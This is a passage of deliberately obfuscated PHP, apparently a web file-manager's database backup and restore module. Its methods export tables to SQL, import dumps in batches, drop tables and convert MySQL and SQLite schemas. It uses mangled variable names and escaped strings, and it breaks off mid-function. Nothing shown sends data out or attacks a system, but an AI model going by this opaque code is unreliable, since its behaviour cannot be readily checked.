->execute("\143\x72\145\x61\x74\x65\40\x64\141\x74\141\142\141\163\145\x20\x60{$Èß¦ìŞÕ}\x60"); } $ ßÚĞÉş[$Ñ»Ñ³É®[1066]] = $Èß¦ìŞÕ; if ($ ßÚĞÉş[$Ñ»Ñ³É®[1061]] == $Ñ»Ñ³É®[1058]) { $ ßÚĞÉş[$Ñ»Ñ³É®[1067]] .= $Ñ»Ñ³É®[1153] . $Èß¦ìŞÕ; } $this->database = $ ßÚĞÉş; $„ÃãÚ¢ ->execute("\165\163\x65\40\140{$Èß¦ìŞÕ}\x60"); return $„ÃãÚ¢ ; } public function createTable($š›³¾ôğ, &$äï¶’Â) { $˜êÚµĞé =& $_SERVER[É¨™èà]; if (!IO::exist($š›³¾ôğ)) { ActionCall($˜êÚµĞé[1154], !0, 0); show_json(LNG($˜êÚµĞé[1155]), !1); } $Ç‚ü…ã® = $this->model()->db(); $×Ä£ÉäÍ = sqlSplit(IO::getContent($š›³¾ôğ)); foreach ($×Ä£ÉäÍ as $Ì¯ø—ñŒ) { $¿ìºäÂØ = stripos($Ì¯ø—ñŒ, $˜êÚµĞé[1156]) === 0; if ($¿ìºäÂØ) { $äï¶’Â->task[$˜êÚµĞé[1157]] += 1; } $Ç‚ü…ã®->execute($Ì¯ø—ñŒ); if ($¿ìºäÂØ) { preg_match($˜êÚµĞé[1158], $Ì¯ø—ñŒ, $«æ…ãÙ„); $äï¶’Â->task[$˜êÚµĞé[1159]] = $«æ…ãÙ„[1]; $äï¶’Â->update(1); } } } public function insertTable($ñËıÛïé, &$Ü˜’‚ÍÇ) { $ü½†·†õ =& $_SERVER[É¨™èà]; $ÖÙµ¸Š§ = $this->model()->db(); $³èãÑ¾€ = $šİİÊåì ? array($šİİÊåì) : $ÖÙµ¸Š§->getTables(); foreach ($ñËıÛïé as $Î÷åö“) { $šİİÊåì = basename($Î÷åö“, $ü½†·†õ[881]); if (!in_array($šİİÊåì, $³èãÑ¾€)) { continue; } $Ü˜’‚ÍÇ->task[$ü½†·†õ[1159]] = $šİİÊåì; if (get_filesize($Î÷åö“) == 0) { continue; } $îÜéùàœ = $this->sqlToDb($Î÷åö“, $Ü˜’‚ÍÇ); if (!$îÜéùàœ) { ActionCall($ü½†·†õ[1154], !0, 0); show_json(LNG($ü½†·†õ[1160]) . "\x5b{$šİİÊåì}\x5d", !1); } } } public function sqlFromDb($“Ñ…Ÿ·î, $ó•ı…², &$Òæ„ò³, $¤ÚóÍÅò = '') { if ($Òæ„ò³) { $Òæ„ò³->task[$_SERVER[É¨™èà][1159]] = $“Ñ…Ÿ·î; } $±çÂÉáÕ = $this->model($“Ñ…Ÿ·î); $±ĞãÙ¥ = 0; $Á¡À»Ûì = 0; $×‹’ô©Ä = 10000; $–îğÉ§ = fopen($ó•ı…², $_SERVER[É¨™èà][1161]); $‹æÒ» = $±çÂÉáÕ->getPk(); $ˆ½ÜÈÁó = $±çÂÉáÕ->getDbFields(); $¨·‰Ìğè = $_SERVER[É¨™èà][12]; if ($GLOBALS[$_SERVER[É¨™èà][880]] && in_array($“Ñ…Ÿ·î, array($_SERVER[É¨™èà][1162], $_SERVER[É¨™èà][1163]))) { $¨·‰Ìğè = $“Ñ…Ÿ·î; } do { $Ü‚¯°†™ = array($‹æÒ» => array($_SERVER[É¨™èà][1108], $Á¡À»Ûì)); $±ÅÃ±î = $±çÂÉáÕ->where($Ü‚¯°†™)->field($ˆ½ÜÈÁó)->order($‹æÒ» . $_SERVER[É¨™èà][1164])->limit($×‹’ô©Ä)->select(); $±ÅÃ±î = !empty($±ÅÃ±î) ? $±ÅÃ±î : array(); if (!($Ûòêù¼– = count($±ÅÃ±î))) { break; } $¤¯ôıƒò = end($±ÅÃ±î); $Á¡À»Ûì = $¤¯ôıƒò[$‹æÒ»]; $«æÍòÉâ = array(); foreach ($±ÅÃ±î as $æ˜È¦¾Ñ) { if ($¨·‰Ìğè) { if ($“Ñ…Ÿ·î == $_SERVER[É¨™èà][1162]) { if ($æ˜È¦¾Ñ[$_SERVER[É¨™èà][33]] == $_SERVER[É¨™èà][1165]) { $ŞÇ™ë½Ö = json_decode($æ˜È¦¾Ñ[$_SERVER[É¨™èà][461]], !0); if ($ŞÇ™ë½Ö[$_SERVER[É¨™èà][32]] == $GLOBALS[$_SERVER[É¨™èà][880]] && $ŞÇ™ë½Ö[$_SERVER[É¨™èà][840]] != 1) { continue; } } } else { if ($æ˜È¦¾Ñ[$_SERVER[É¨™èà][33]] == $_SERVER[É¨™èà][1166] && $æ˜È¦¾Ñ[$_SERVER[É¨™èà][97]] == $_SERVER[É¨™èà][876]) { continue; } } } if ($¤ÚóÍÅò) { $æ˜È¦¾Ñ[$_SERVER[É¨™èà][87]] = "\x7b\151\x6f\72{$¤ÚóÍÅò}\x7d" . substr($æ˜È¦¾Ñ[$_SERVER[É¨™èà][87]], strlen("\173\x69\157\x3a{$æ˜È¦¾Ñ[$_SERVER[É¨™èà][914]]}\x7d")); $æ˜È¦¾Ñ[$_SERVER[É¨™èà][914]] = $¤ÚóÍÅò; } $«æÍòÉâ[] = $_SERVER[É¨™èà][1167] . $this->sqlEncode($æ˜È¦¾Ñ) . $_SERVER[É¨™èà][1168]; } $å½®íê‘ = "\x49\x4e\x53\105\122\124\x20\x49\x4e\x54\x4f\x20\140{$“Ñ…Ÿ·î}\x60\40\50\140" . implode($_SERVER[É¨™èà][1169], $ˆ½ÜÈÁó) . $_SERVER[É¨™èà][1170]; fwrite($–îğÉ§, $å½®íê‘ . implode($_SERVER[É¨™èà][1171], $«æÍòÉâ) . $_SERVER[É¨™èà][74] . PHP_EOL); $±ĞãÙ¥ += $Ûòêù¼–; if ($Òæ„ò³) { $Òæ„ò³->update($Ûòêù¼–); } } while ($×‹’ô©Ä == $Ûòêù¼–); fclose($–îğÉ§); return $±ĞãÙ¥; } public function sqlToDb($üÔåĞ¢Ø, &$…œşÕ¥Ÿ) { $ô‹ïßŠ =& $_SERVER[É¨™èà]; $ßğôÃŞİ = $this->model()->db(); $ú×ì¬¦¶ = @fopen($üÔåĞ¢Ø, $ô‹ïßŠ[1172]); if (!$ú×ì¬¦¶) { return !1; } $»Ñâáò– = 0; $äì‹ö¶ = $ô‹ïßŠ[12]; $ÂÔôìÄè = array(); $‚Ğ—Šõ‹ = $this->dbType(); $°±ş˜Î = $‚Ğ—Šõ‹ == $ô‹ïßŠ[13] ? 500 : 2000; $íòÀÚÂ = basename($üÔåĞ¢Ø, $ô‹ïßŠ[881]); $Ô’ÎÍİÅ = 0; $¦ñ”Úáå = 4194304; while (!feof($ú×ì¬¦¶)) { $Ëâ¬£Î‰ = trim(fgets($ú×ì¬¦¶)); if (!$Ëâ¬£Î‰) { continue; } $¬Ÿ Œìî = $this->sqlDecode($Ëâ¬£Î‰, $‚Ğ—Šõ‹, $íòÀÚÂ); if (stripos($¬Ÿ Œìî, $ô‹ïßŠ[441]) === 0) { if (!$äì‹ö¶) { $äì‹ö¶ = $¬Ÿ Œìî . $ô‹ïßŠ[53]; } continue; } if ($…œşÕ¥Ÿ) { $…œşÕ¥Ÿ->task[$ô‹ïßŠ[1157]] += 1; } $»Ñâáò–++; $ÂÔôìÄè[] = rtrim(rtrim(trim($¬Ÿ Œìî), $ô‹ïßŠ[50]), $ô‹ïßŠ[74]); $ÃÄİ¢’¿ = null; $ÒœšğàÃ = strlen($¬Ÿ Œìî); $Ô’ÎÍİÅ += $ÒœšğàÃ; $ò’‚ê£ = strlen($äì‹ö¶) + $Ô’ÎÍİÅ + (count($ÂÔôìÄè) - 1); if ($ò’‚ê£ >= $¦ñ”Úáå) { $ÃÄİ¢’¿ = array_pop($ÂÔôìÄè); if ($»Ñâáò– > 1) { $»Ñâáò–--; } } if ($»Ñâáò– >= $°±ş˜Î || $ÃÄİ¢’¿) { $¬Ÿ Œìî = $äì‹ö¶ . implode($ô‹ïßŠ[50], $ÂÔôìÄè); if (!$ßğôÃŞİ->execute($¬Ÿ Œìî)) { return !1; } if ($…œşÕ¥Ÿ) { $…œşÕ¥Ÿ->update($»Ñâáò–); } $ÂÔôìÄè = array(); $»Ñâáò– = 0; $Ô’ÎÍİÅ = 0; if ($ÃÄİ¢’¿) { $ÂÔôìÄè = array($ÃÄİ¢’¿); $»Ñâáò– = 1; $Ô’ÎÍİÅ = $ÒœšğàÃ; } } } fclose($ú×ì¬¦¶); if (!empty($ÂÔôìÄè)) { $¬Ÿ Œìî = $äì‹ö¶ . implode($ô‹ïßŠ[50], $ÂÔôìÄè); if (!$ßğôÃŞİ->execute($¬Ÿ Œìî)) { return !1; } if ($…œşÕ¥Ÿ) { $…œşÕ¥Ÿ->update($»Ñâáò–); } } return !0; } public function dropTable($È‚Ø Í© = null) { $Âã¿£Ÿñ = $this->model()->db(); $éöÀ¸úÒ = $È‚Ø Í© ? array($È‚Ø Í©) : $Âã¿£Ÿñ->getTables(); if (!$éöÀ¸úÒ) { return; } foreach ($éöÀ¸úÒ as $È‚Ø Í©) { if ($È‚Ø Í©) { $È‚Ø Í© = strtolower($È‚Ø Í©); } else { continue; } $Âã¿£Ÿñ->execute("\144\x72\157\x70\40\x74\141\142\154\145\40\151\x66\x20\145\170\x69\x73\164\163\x20\x60{$È‚Ø Í©}\140"); } } private function sqlEncode($ÈÉ¢Û€) { $êĞ®ÛÜó =& $_SERVER[É¨™èà]; $ğçä×„½ = array(); foreach ($ÈÉ¢Û€ as $É½­©äø) { if (is_array($É½­©äø)) { $É½­©äø = json_encode_force($É½­©äø); } $É½­©äø = addslashes($É½­©äø); $É½­©äø = str_replace(array($êĞ®ÛÜó[1173], $êĞ®ÛÜó[288], $êĞ®ÛÜó[428]), array($êĞ®ÛÜó[1174], $êĞ®ÛÜó[1175], $êĞ®ÛÜó[1176]), $É½­©äø); $ğçä×„½[] = $É½­©äø; } return $êĞ®ÛÜó[58] . implode($êĞ®ÛÜó[1177], $ğçä×„½) . $êĞ®ÛÜó[58]; } private function sqlDecode($«Æ¹­Æ, $ë³”Ò¦, $ûÔ£Óôœ = '') { $„Ü¦Òøš =& $_SERVER[É¨™èà]; $«Æ¹­Æ = str_replace(array($„Ü¦Òøš[1174], $„Ü¦Òøš[1175], $„Ü¦Òøš[1176]), array($„Ü¦Òøš[1173], $„Ü¦Òøš[288], $„Ü¦Òøš[428]), $«Æ¹­Æ); if ($ë³”Ò¦ == $„Ü¦Òøš[13]) { $«Æ¹­Æ = str_ireplace($„Ü¦Òøš[1178], $„Ü¦Òøš[59], $«Æ¹­Æ); $«Æ¹­Æ = stripslashes($«Æ¹­Æ); } return preg_replace($„Ü¦Òøš[1179], $„Ü¦Òøš[12], $«Æ¹­Æ); if ($ë³”Ò¦ == $„Ü¦Òøš[13]) { return $ûÔ£Óôœ != $„Ü¦Òøš[875] ? stripslashes($«Æ¹­Æ) : $«Æ¹­Æ; } if ($ûÔ£Óôœ == $„Ü¦Òøš[875]) { $«Æ¹­Æ = str_replace($„Ü¦Òøš[1180], $„Ü¦Òøš[121], stripslashes($«Æ¹­Æ)); } return $«Æ¹­Æ; } public function getSqlFile($Üªù•§‘ = '') { $Ä”»ü°Â =& $_SERVER[É¨™èà]; $¹¸õ ¸² = $this->dbType(!0); $â·ğ¦Ù¸ = CONTROLLER_DIR . "\151\156\163\164\x61\154\x6c\x2f\144\x61\164\x61\57{$¹¸õ ¸²}\56\x73\x71\154"; if (!file_exists($â·ğ¦Ù¸)) { return !1; } $»‡ÙÁºü = file_get_contents($â·ğ¦Ù¸); $¨¶ÑìÇ× = $Ä”»ü°Â[1181] . ($¹¸õ ¸² == $Ä”»ü°Â[899] ? $Ä”»ü°Â[1182] : $Ä”»ü°Â[1183]) . $Ä”»ü°Â[1184]; preg_match_all($¨¶ÑìÇ×, $»‡ÙÁºü, $èü÷Íß); $âÁåıÓâ = $èü÷Íß[1]; $×¿¿»åÑ = $this->model()->db(); $Ø×´á™Î = $×¿¿»åÑ->getTables(); $—Ğƒ—Î³ = TEMP_FILES . $Ä”»ü°Â[1185] . date($Ä”»ü°Â[262]) . $Ä”»ü°Â[8]; del_dir($—Ğƒ—Î³); mk_dir($—Ğƒ—Î³); $†ÄÙŸŞÆ = $—Ğƒ—Î³ . $Ä”»ü°Â[1186]; $²™£ºÇ = $—Ğƒ—Î³ . $Ä”»ü°Â[1187]; $öËÓ•à¢ = $¹¸õ ¸² == $Ä”»ü°Â[13] ? $Ä”»ü°Â[899] : $Ä”»ü°Â[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\57\x64\x61\164\x61\x2f{$öËÓ•à¢}\56\163\x71\x6c", $—Ğƒ—Î³); @touch($—Ğƒ—Î³ . $¹¸õ ¸² . $Ä”»ü°Â[881]); $ôÂ´ ì = fopen($†ÄÙŸŞÆ, $Ä”»ü°Â[1161]); $¥•¸ùİë = fopen($²™£ºÇ, $Ä”»ü°Â[1161]); if ($¹¸õ ¸² == $Ä”»ü°Â[13]) { $Ø×´á™Î = array_diff($Ø×´á™Î, array($Ä”»ü°Â[873], $Ä”»ü°Â[874])); $÷Óìí¯Ù = array($Ä”»ü°Â[1188], $Ä”»ü°Â[1189], $Ä”»ü°Â[1190]); fwrite($¥•¸ùİë, implode(PHP_EOL, $÷Óìí¯Ù) . PHP_EOL . PHP_EOL); foreach ($Ø×´á™Î as $µÕ„¨×) { $ÀÎÌ½“µ = $this->sqlFromSqlite($µÕ„¨×); if (!$ÀÎÌ½“µ[$Ä”»ü°Â[13]]) { continue; } fwrite($¥•¸ùİë, $ÀÎÌ½“µ[$Ä”»ü°Â[13]] . PHP_EOL . PHP_EOL); if (!in_array($µÕ„¨×, $âÁåıÓâ)) { fwrite($ôÂ´ ì, $ÀÎÌ½“µ[$Ä”»ü°Â[899]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ø×´á™Î as $µÕ„¨×) { $ÀÎÌ½“µ = $this->sqlFromMysql($µÕ„¨×); if (!$ÀÎÌ½“µ[$Ä”»ü°Â[899]]) { continue; } fwrite($ôÂ´ ì, $ÀÎÌ½“µ[$Ä”»ü°Â[899]] . PHP_EOL . PHP_EOL); if (!in_array($µÕ„¨×, $âÁåıÓâ)) { fwrite($¥•¸ùİë, $ÀÎÌ½“µ[$Ä”»ü°Â[13]] . PHP_EOL . PHP_EOL); } } } fclose($ôÂ´ ì); fclose($¥•¸ùİë); $»‡ÙÁºü = array($Ä”»ü°Â[899] => $†ÄÙŸŞÆ, $Ä”»ü°Â[13] => $²™£ºÇ); return $Üªù•§‘ ? $»‡ÙÁºü[$Üªù•§‘] : $»‡ÙÁºü; } public function dbType($ÙÉñô½º = false) { $ÁÆ÷¸ŒÄ =& $_SERVER[É¨™èà]; $óÓÈÇ† = $ÙÉñô½º ? $GLOBALS[$ÁÆ÷¸ŒÄ[6]][$ÁÆ÷¸ŒÄ[21]] : $this->database; $óÓÈÇ† = array_change_key_case($óÓÈÇ†); $Ìûİşúò = $óÓÈÇ†[$ÁÆ÷¸ŒÄ[1061]]; if ($Ìûİşúò == $ÁÆ÷¸ŒÄ[1058]) { $¤„ö•ê = explode($ÁÆ÷¸ŒÄ[4], $óÓÈÇ†[$ÁÆ÷¸ŒÄ[1067]]); $Ìûİşúò = $¤„ö•ê[0]; } $ùìÖÓ¨µ = array($ÁÆ÷¸ŒÄ[1191] => $ÁÆ÷¸ŒÄ[13], $ÁÆ÷¸ŒÄ[1006] => $ÁÆ÷¸ŒÄ[899]); if (isset($ùìÖÓ¨µ[$Ìûİşúò])) { $Ìûİşúò = $ùìÖÓ¨µ[$Ìûİşúò]; } return $Ìûİşúò; } public function sqlFromMysql($ûçèÇÉ¬, $Û¡Éõ‰Ï = '') { $œß¿• =& $_SERVER[É¨™èà]; $Ş¿Â¡¦õ = $this->model()->db(); $ú‚ÆÄ¾ = $Ş¿Â¡¦õ->query($œß¿•[1192] . $ûçèÇÉ¬ . $œß¿•[471]); if (!$ú‚ÆÄ¾ || !$ú‚ÆÄ¾[0]) { return !1; } $Ø¾š« = _get($ú‚ÆÄ¾[0], $œß¿•[1193], $œß¿•[12]); if (!$Ø¾š«) { return !1; } $Ô‹¼í = "\x44\122\117\120\x20\124\x41\x42\x4c\x45\40\x49\106\40\105\130\x49\x53\x54\123\40\140{$ûçèÇÉ¬}\140\73" . PHP_EOL . $Ø¾š« . $œß¿•[74]; if ($Û¡Éõ‰Ï && $Û¡Éõ‰Ï == $œß¿•[899]) { return $Ô‹¼í; } $£µä§ = array_change_key_case($GLOBALS[$œß¿•[6]][$œß¿•[21]]); $‰ê¯ã§‘ = $£µä§[$œß¿•[1066]]; $à‘¬îî– = $œß¿•[1194] . $‰ê¯ã§‘ . $œß¿•[1195] . $ûçèÇÉ¬ . $œß¿•[58]; $šáÁ¥î¶ = $œß¿•[1196] . $ûçèÇÉ¬ . $œß¿•[994]; $Ş„÷†à = $Ş¿Â¡¦õ->query($à‘¬îî–); if (empty($Ş„÷†à)) { $ŠÑ’ö• = array($œß¿•[899] => $œß¿•[12], $œß¿•[13] => $œß¿•[12]); return $Û¡Éõ‰Ï ? $ŠÑ’ö•[$Û¡Éõ‰Ï] : $ŠÑ’ö•; } $Ì–É´Î­ = $Ş¿Â¡¦õ->query($šáÁ¥î¶); $Äßò¶·˜ = $œß¿•[12]; $ŸÑ‡Äªô = array(); foreach ($Ì–É´Î­ as $¹œëœ˜Å) { if (!$Äßò¶·˜ && $¹œëœ˜Å[$œß¿•[1197]] == $œß¿•[1198]) { $Äßò¶·˜ = $¹œëœ˜Å[$œß¿•[1199]]; } if (isset($ŸÑ‡Äªô[$¹œëœ˜Å[$œß¿•[1197]]])) { $ŸÑ‡Äªô[$¹œëœ˜Å[$œß¿•[1197]]][$œß¿•[1200]][] = $¹œëœ˜Å[$œß¿•[1199]]; continue; } $ŸÑ‡Äªô[$¹œëœ˜Å[$œß¿•[1197]]] = array($œß¿•[1201] => $¹œëœ˜Å[$œß¿•[1197]], $œß¿•[1200] => array($¹œëœ˜Å[$œß¿•[1199]]), $œß¿•[1202] => $¹œëœ˜Å[$œß¿•[1203]] == $œß¿•[91] ? 0 : 1); } $øô»Ë®¦ = array(); foreach ($ŸÑ‡Äªô as $¹œëœ˜Å) { $¼¹ËÏ¸Ù = $¹œëœ˜Å[$œß¿•[1201]] == $œß¿•[1198]; $Ø±¿ªÅ = array($œß¿•[1204], $¹œëœ˜Å[$œß¿•[1202]] == $œß¿•[91] && !$¼¹ËÏ¸Ù ? $œß¿•[1205] : $œß¿•[12], $œß¿•[1206], $œß¿•[1207] . $ûçèÇÉ¬ . $œß¿•[11] . ($¼¹ËÏ¸Ù ? $œß¿•[1208] : $¹œëœ˜Å[$œß¿•[1201]]) . $œß¿•[121], $œß¿•[1209], $œß¿•[121] . $ûçèÇÉ¬ . $œß¿•[121], $œß¿•[1210] . implode($œß¿•[1211], $¹œëœ˜Å[$œß¿•[1200]]) . $œß¿•[1212]); $øô»Ë®¦[] = implode($œß¿•[53], $Ø±¿ªÅ) . $œß¿•[74]; } $´ê…ˆÏ = array(); $‘›ê†ô¿ = array($œß¿•[1213] => $œß¿•[1214], $œß¿•[1214] => $œß¿•[1214], $œß¿•[375] => $œß¿•[401], $œß¿•[374] => $œß¿•[401]); foreach ($Ş„÷†à as $¹œëœ˜Å) { $Ø±¿ªÅ = array($œß¿•[121] . $¹œëœ˜Å[$œß¿•[1215]] . $œß¿•[121], isset($‘›ê†ô¿[$¹œëœ˜Å[$œß¿•[1216]]]) ? $‘›ê†ô¿[$¹œëœ˜Å[$œß¿•[1216]]] : $¹œëœ˜Å[$œß¿•[1217]], $¹œëœ˜Å[$œß¿•[1218]] == $œß¿•[992] ? $œß¿•[1219] : $œß¿•[1220], $¹œëœ˜Å[$œß¿•[1215]] == $Äßò¶·˜ ? $œß¿•[1221] : $œß¿•[12], $¹œëœ˜Å[$œß¿•[1043]] ? strtoupper(str_replace($œß¿•[11], $œß¿•[12], $¹œëœ˜Å[$œß¿•[1043]])) : $œß¿•[12]); $´ê…ˆÏ[] = trim(implode($œß¿•[53], $Ø±¿ªÅ)); } $í†Ùè¤§ = array($œß¿•[1222] . $ûçèÇÉ¬ . $œß¿•[1223], $œß¿•[1224] . $ûçèÇÉ¬ . $œß¿•[1225], implode($œß¿•[50] . PHP_EOL, $´ê…ˆÏ), $œß¿•[1040]); $ÁéĞØ¼Ğ = implode(PHP_EOL, array_merge($í†Ùè¤§, $øô»Ë®¦)); if ($Û¡Éõ‰Ï && $Û¡Éõ‰Ï == $œß¿•[13]) { return $ÁéĞØ¼Ğ; } $ŠÑ’ö• = array($œß¿•[899] => $Ô‹¼í, $œß¿•[13] => $ÁéĞØ¼Ğ); return $Û¡Éõ‰Ï ? $ŠÑ’ö•[$Û¡Éõ‰Ï] : $ŠÑ’ö•; } public function sqlFromSqlite($íÄù‹…¯, $ÖÌ½ÂÃ° = '') { $¿Şà¬ûÚ =& $_SERVER[É¨™èà]; $š×Ôàğ© = $this->model()->db(); $ùîø° = "\x50\122\101\107\x4d\x41\40\124\101\102\114\105\x5f\x49\116\106\x4f\x20\x28\47{$íÄù‹…¯}\47\x29"; $ÖÈ‚›ä« = "\x53\x45\x4c\105\103\124\x20\x2a\40\x46\x52\x4f\115\x20\163\x71\154\151\x74\x65\137\x6d\141\x73\x74\x65\x72\40\127\x48\x45\122\105\x20\164\142\x6c\x5f\156\x61\x6d\145\x20\75\x20\x27{$íÄù‹…¯}\47"; $µ«¥ê©¿ = $š×Ôàğ©->query($ùîø°); if (empty($µ«¥ê©¿)) { $ç‡¼âÅ« = array($¿Şà¬ûÚ[899] => $¿Şà¬ûÚ[12], $¿Şà¬ûÚ[13] => $¿Şà¬ûÚ[12]); return $ÖÌ½ÂÃ° ? $ç‡¼âÅ«[$ÖÌ½ÂÃ°] : $ç‡¼âÅ«; } $«”¤ú” = $š×Ôàğ©->query($ÖÈ‚›ä«); $§Ûƒöò± = $™°¯îõë = array(); foreach ($«”¤ú” as $æïç¾ïÔ) { if ($æïç¾ïÔ[$¿Şà¬ûÚ[33]] == $¿Şà¬ûÚ[368]) { $§Ûƒöò±[] = $æïç¾ïÔ[$¿Şà¬ûÚ[1226]]; } else { $™°¯îõë[$æïç¾ïÔ[$¿Şà¬ûÚ[32]]] = $æïç¾ïÔ[$¿Şà¬ûÚ[1226]]; } } $Ôş–‘ïÒ = array_merge(array($¿Şà¬ûÚ[1222] . $íÄù‹…¯ . $¿Şà¬ûÚ[121]), $§Ûƒöò±, array_values($™°¯îõë)); $Ôş–‘ïÒ = implode($¿Şà¬ûÚ[74] . PHP_EOL, $Ôş–‘ïÒ) . $¿Şà¬ûÚ[74]; if ($ÖÌ½ÂÃ° && $ÖÌ½ÂÃ° == $¿Şà¬ûÚ[13]) { return $Ôş–‘ïÒ; } $ßòÆ¡ğ© = array(); foreach ($™°¯îõë as $ò§”ŸŒ => $ôÌ¬æÁ§) { $¸’›È½é = str_replace($¿Şà¬ûÚ[1227] . $íÄù‹…¯ . $¿Şà¬ûÚ[11], $¿Şà¬ûÚ[12], $ò§”ŸŒ); $¸’›È½é = str_replace($íÄù‹…¯ . $¿Şà¬ûÚ[11], $¿Şà¬ûÚ[12], $ò§”ŸŒ); $êŠ©Ôï‰ = str_replace(array($¿Şà¬ûÚ[121], $¿Şà¬ûÚ[1051]), $¿Şà¬ûÚ[471], substr($ôÌ¬æÁ§, stripos($ôÌ¬æÁ§, $¿Şà¬ûÚ[349]))); $ßòÆ¡ğ©[$¸’›È½é] = $êŠ©Ôï‰; } $Êƒöõ‰á = array(); $ÁÎ·ğ = array($¿Şà¬ûÚ[1214] => $¿Şà¬ûÚ[1228], $¿Şà¬ûÚ[401] => $¿Şà¬ûÚ[1229]); $¹ĞàÙó = $•ê£Õ´» = $¿Şà¬ûÚ[12]; foreach ($µ«¥ê©¿ as $æïç¾ïÔ) { if ($æïç¾ïÔ[$¿Şà¬ûÚ[57]] == $¿Şà¬ûÚ[91]) { $¹ĞàÙó = $æïç¾ïÔ[$¿Şà¬ûÚ[32]]; } $†‰½‡ù¢ = $æïç¾ïÔ[$¿Şà¬ûÚ[33]]; if ($†‰½‡ù¢ == $¿Şà¬ûÚ[1230] && isset($ßòÆ¡ğ©[$æïç¾ïÔ[$¿Şà¬ûÚ[32]]])) { $†‰½‡ù¢ = $¿Şà¬ûÚ[1231]; } $ş¼Ø‚öÒ = array($¿Şà¬ûÚ[471] . $æïç¾ïÔ[$¿Şà¬ûÚ[32]] . $¿Şà¬ûÚ[471], _get($ÁÎ·ğ, $†‰½‡ù¢, $†‰½‡ù¢), $æïç¾ïÔ[$¿Şà¬ûÚ[35]] == $¿Şà¬ûÚ[91] ? $¿Şà¬ûÚ[1219] : $¿Şà¬ûÚ[1232] . $æïç¾ïÔ[$¿Şà¬ûÚ[56]], $æïç¾ïÔ[$¿Şà¬ûÚ[57]] == $¿Şà¬ûÚ[91] ? $¿Şà¬ûÚ[1233] : $¿Şà¬ûÚ[12]); $Êƒöõ‰á[] = trim(implode($¿Şà¬ûÚ[53], $ş¼Ø‚öÒ)); } foreach ($ßòÆ¡ğ© as $¸’›È½é => $êŠ©Ôï‰) { if ($¸’›È½é == $¿Şà¬ûÚ[1208]) { $…ŠíŒÁğ = $•ê£Õ´» = $¿Şà¬ûÚ[1234] . $¹ĞàÙó . $¿Şà¬ûÚ[1235]; } else { $…ŠíŒÁğ = (stripos($¸’›È½é, $¿Şà¬ûÚ[11]) ? $¿Şà¬ûÚ[1236] : $¿Şà¬ûÚ[12]) . ($¿Şà¬ûÚ[1237] . $¸’›È½é . $¿Şà¬ûÚ[1238] . $êŠ©Ôï‰); } $Êƒöõ‰á[] = $…ŠíŒÁğ; } if ($¹ĞàÙó && !$•ê£Õ´») { $Êƒöõ‰á = array_merge(array($¿Şà¬ûÚ[1234] . $¹ĞàÙó . $¿Şà¬ûÚ[1235]), $Êƒöõ‰á); } $şÓŞ„Áµ = array($¿Şà¬ûÚ[1239] . $íÄù‹…¯ . $¿Şà¬ûÚ[1240], $¿Şà¬ûÚ[1241] . $íÄù‹…¯ . $¿Şà¬ûÚ[1242], implode($¿Şà¬ûÚ[50] . PHP_EOL, $Êƒöõ‰á), $¿Şà¬ûÚ[1243]); $â’¾ô¶Ó = implode(PHP_EOL, $şÓŞ„Áµ); if ($ÖÌ½ÂÃ° && $ÖÌ½ÂÃ° == $¿Şà¬ûÚ[899]) { return $â’¾ô¶Ó; } $ç‡¼âÅ« = array($¿Şà¬ûÚ[899] => $â’¾ô¶Ó, $¿Şà¬ûÚ[13] => $Ôş–‘ïÒ); return $ÖÌ½ÂÃ° ? $ç‡¼âÅ«[$ÖÌ½ÂÃ°] : $ç‡¼âÅ«; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¥ÅÌ÷Ì´, $Š¶éÎÇ½) { $˜ŠçÎ×Î =& $_SERVER[É¨™èà]; $œåüŞ¿‚ = $Š¶éÎÇ½; $GLOBALS[$˜ŠçÎ×Î[1244]] = $˜ŠçÎ×Î[1245] . $¥ÅÌ÷Ì´; Hook::trigger($˜ŠçÎ×Î[1245] . $¥ÅÌ÷Ì´ . $˜ŠçÎ×Î[1246], $œåüŞ¿‚); $äœú²Û = self::driverMake($Š¶éÎÇ½[0]); if (!$äœú²Û) { return !1; } if ($¥ÅÌ÷Ì´ == $˜ŠçÎ×Î[633] || $¥ÅÌ÷Ì´ == $˜ŠçÎ×Î[635] || $¥ÅÌ÷Ì´ == $˜ŠçÎ×Î[1247]) { if (!trim($äœú²Û->path . $˜ŠçÎ×Î[316], $˜ŠçÎ×Î[8])) { return !1; } } if (method_exists($äœú²Û, $¥ÅÌ÷Ì´)) { $îÀÎ¿«Ë = @call_user_func_array(array($äœú²Û, $¥ÅÌ÷Ì´), $Š¶éÎÇ½); } else { if (method_exists($äœú²Û, $˜ŠçÎ×Î[1248])) { $îÀÎ¿«Ë = @call_user_func_array(array($äœú²Û, $¥ÅÌ÷Ì´), $Š¶éÎÇ½); } else { if (method_exists(self, $¥ÅÌ÷Ì´)) { $îÀÎ¿«Ë = @call_user_func_array(array(self, $¥ÅÌ÷Ì´), $Š¶éÎÇ½); } else { $îÀÎ¿«Ë = call_user_func_array(array(parent, $¥ÅÌ÷Ì´), $Š¶éÎÇ½); } } } Hook::trigger($˜ŠçÎ×Î[1245] . $¥ÅÌ÷Ì´ . $˜ŠçÎ×Î[1249], $œåüŞ¿‚, $îÀÎ¿«Ë); return $îÀÎ¿«Ë; } public static function init($Üïî‘±ƒ) { return self::driverMake($Üïî‘±ƒ); } public static function copy($ÒÅşÃŞ½, $ŞÂïâû°, $¯¦ÓŒ»• = false, $ªéÎÇî‰ = false) { return self::copyMoveStart($ÒÅşÃŞ½, $ŞÂïâû°, $¯¦ÓŒ»•, $_SERVER[É¨™èà][633], $ªéÎÇî‰); } public static function move($²êÌş, $´šã¯¯¾, $İøØË¹— = false, $ëç“­§Ê = false) { return self::copyMoveStart($²êÌş, $´šã¯¯¾, $İøØË¹—, $_SERVER[É¨™èà][635], $ëç“­§Ê); } public static function copyMoveChildren($…ôŒúâø, $ÀµôÕ¼±, $ıï«à†Ğ = "\x63\x6f\160\171", $ëÔíãÑÖ = REPEAT_REPLACE) { $ûíŠÃÏÀ =& $_SERVER[É¨™èà]; $Â¬œœã = $…ôŒúâø; $ˆõı‡Õô = self::driverMake($…ôŒúâø); $ÂÛÖ®Í = $ˆõı‡Õô->listPath($…ôŒúâø, !0); $”®õ‘—ó = array_merge($ÂÛÖ®Í[$ûíŠÃÏÀ[86]], $ÂÛÖ®Í[$ûíŠÃÏÀ[85]]); foreach ($”®õ‘—ó as $ÅÕß¾ÙÀ) { 